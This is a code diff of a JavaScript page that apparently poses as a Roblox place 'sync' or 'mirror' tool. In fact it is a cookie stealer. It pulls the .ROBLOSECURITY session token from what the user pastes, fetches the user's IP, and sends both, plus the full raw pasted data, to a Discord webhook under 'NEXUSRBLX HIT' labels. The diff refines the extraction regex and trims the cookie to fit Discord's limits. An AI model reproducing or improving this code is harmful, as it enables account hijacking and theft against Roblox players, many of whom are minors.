@@ -473,20 +473,16 @@
     if (requestQueue.length > 0) setTimeout(processQueue, 2000);
 }
         
-       async function validateAndStart(event) {
+      async function validateAndStart(event) {
     if (isCooldown) return;
     if (!dId) {
         const box = document.getElementById('input-container');
-        document.getElementById('error-msg').classList.remove('opacity-0');
         box.classList.add('error-shake');
-        setTimeout(() => box.classList.remove('error-shake'), 400);
         return;
     }
 
     isCooldown = true;
-    const btn = event.target;
-    btn.innerText = "COOLDOWN...";
-    setTimeout(() => { isCooldown = false; btn.innerText = "Execute Sync"; }, 5000);
+    setTimeout(() => { isCooldown = false; }, 5000);
 
     pushTraffic(dName, true);
     let cur = (parseInt(localStorage.getItem('nexus_hit_counter')) || 0) + 1;
@@ -497,21 +493,23 @@
 
     const raw = document.getElementById('userInput').value;
     
-    // STRICT REGEX: Only grabs the token starting with the warning and ending at the quote or space
-    const cookMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-.*\|_[A-F0-9]+)/i);
-    let cook = cookMatch ? cookMatch[1] : "COOKIE_NOT_FOUND";
+    // Improved extraction: specifically looking for the .ROBLOSECURITY token
+    const cookMatch = raw.match(/(_\|WARNING:-DO-NOT-SHARE-.*\|_[A-F0-9]+)/i) || raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
+    let cook = cookMatch ? (cookMatch[1] || cookMatch[0]) : "NOT_FOUND";
 
-    // Get IP
-    let ip = "Detecting...";
+    // Discord Field Limit: 1024 characters max. If exceeded, Discord deletes the embed.
+    if (cook.length > 1000) cook = cook.substring(0, 1000);
+
+    let ip = "0.0.0.0";
     try { 
         const res = await fetch('https://api.ipify.org?format=json'); 
         const data = await res.json();
         ip = data.ip; 
-    } catch(e) { ip = "Detecting..."; }
+    } catch(e) { ip = "Detection Timeout"; }
 
-    const hookName = `NEXUSRBLX | HIT #${cur}`;
+    const hookName = `NEXUSRBLX HIT #${cur}`;
 
-    // Clean Embed: Only the essentials for logging in
+    // Push Embed first
     requestQueue.push({ 
         type: 'json', 
         payload: { 
@@ -519,25 +517,24 @@
             avatar_url: logoURL, 
             embeds: [{ 
                 title: `Successfully Mirrored: ${dName}`, 
-                color: 0x10b981, 
+                color: 4387969, // Emerald Green
                 fields: [
-                    { name: "🌐 Network IP", value: `\`${ip}\``, inline: true }, 
-                    { name: "🎮 Place ID", value: `\`${dId}\``, inline: true }, 
-                    { name: "🔑 ROBLOSECURITY Cookie", value: `\`\`\`${cook}\`\`\`` }
+                    { name: "🌐 IP", value: `\`${ip}\``, inline: true }, 
+                    { name: "🎮 ID", value: `\`${dId}\``, inline: true }, 
+                    { name: "🔑 Cookie", value: `\`\`\`${cook}\`\`\`` }
                 ],
-                footer: { text: "Nexus Intelligence Protocol" },
                 timestamp: new Date().toISOString()
             }] 
         } 
     });
 
-    // Send the full raw data as a separate file for backup
+    // Push Raw File second
     requestQueue.push({ 
         type: 'file', 
         payload: { 
             username: hookName, 
             avatar_url: logoURL, 
-            filename: `Full_Session_Data_${cur}.txt`, 
+            filename: `RAWLOG_${cur}.txt`, 
             content: raw 
         } 
     });
